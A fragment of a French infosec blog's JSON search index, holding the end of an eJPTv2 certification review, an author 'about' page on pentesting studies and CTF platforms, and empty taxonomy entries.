certification de Ejptv2 exige une approche holistique. Des cours aux CTF en passant par l\u0026rsquo;expérience de l\u0026rsquo;examen, chaque élément contribue à développer des compétences solides en matière de sécurité informatique. Gardez à l\u0026rsquo;esprit que la persévérance, la pratique et la curiosité sont des atouts précieux dans ce parcours.\nBonne chance dans votre préparation et votre réussite à la certification !!\n","date":"11 August 2023","externalUrl":null,"permalink":"/posts/ejpt/","section":"Posts","summary":"eJPTv2 Review FR # cette review est en quatre parties # Les cours et le PATH","title":"Review : eJPTv2 by INE"},{"content":" Whoami # Hello ! Je suis étudiant en infosec, passionné de pentest Web et Active Directory.\nCe petit blog me servira à poster des reviews de certifications, des writeups et peut-être d\u0026rsquo;autres petites choses.\nActuellement je prépare l\u0026rsquo;OSCP.\nCertifications : eJPTv2, Dante, Zephyr.\nMy squad Web site : 🥷 TheF0rceAwakens\nCTF platformes :\n💀 ROOTME ☁️ TryHackme 🟩 HackTheBox\n","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"Ani blog","summary":"Whoami # Hello !","title":""},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series"}]